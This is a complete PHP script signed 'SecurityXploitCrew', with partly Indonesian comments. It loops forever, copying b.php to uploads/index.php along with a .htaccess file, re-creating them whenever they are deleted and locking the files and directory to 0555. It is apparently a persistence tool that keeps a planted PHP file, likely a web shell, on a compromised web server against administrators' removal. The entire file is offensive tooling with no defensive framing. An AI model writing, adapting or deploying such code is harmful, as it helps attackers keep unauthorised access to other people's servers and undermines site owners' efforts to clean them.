<?php
// SecurityXploitCrew
// This script will ensure that files are created and then set permissions to 0555 for both files and directories

$sourceFile1 = "b.php"; // File yang mau dicopy
$sourceFile2 = ".htaccess"; // File yang mau dicopy .htaccess
$directory = "uploads";
$file = "index.php"; // File yang akan meniru source dari b.php
$file2 = ".htaccess"; // File yang akan meniru source dari .htaccess

// Function to ensure the directory exists
function ensureDirectory($directory) {
    if (!file_exists($directory)) {
        mkdir($directory, 0777, true); // Create the directory with proper permissions
    }
}

// Function to set permissions to 0555 for both directory and file
function setPermissions($directory, $file) {
    // Set directory permissions to 0555 (read and execute for everyone, but not writable)
    chmod($directory, 0555);

    // Set file permissions to 0555 (read and execute for everyone, but not writable)
    chmod($file, 0555);
}

// Function to copy a file
function copyFile($source, $directory, $file) {
    ensureDirectory($directory); // Ensure the directory exists

    $filePath = $directory . '/' . $file; // Construct the full file path
    copy($source, $filePath); // Copy the file

    // Set file permissions to 0555 (read and execute for everyone, but not writable)
    chmod($filePath, 0555);
}

function handleFiles() {
    global $sourceFile1, $directory, $file, $sourceFile2, $file2;

    // Handle the first file
    $filePath = $directory . '/' . $file;
    if (!file_exists($filePath)) {
        copyFile($sourceFile1, $directory, $file);
    }

    // Handle the second file
    $filePath2 = $directory . '/' . $file2;
    if (!file_exists($filePath2)) {
        copyFile($sourceFile2, $directory, $file2);
    }

    // After files are created, set permissions
    setPermissions($directory, $filePath);
    setPermissions($directory, $filePath2);
}

while (1) {
    handleFiles();
    sleep(1); // Sleep for 1 second before checking again
}
?>
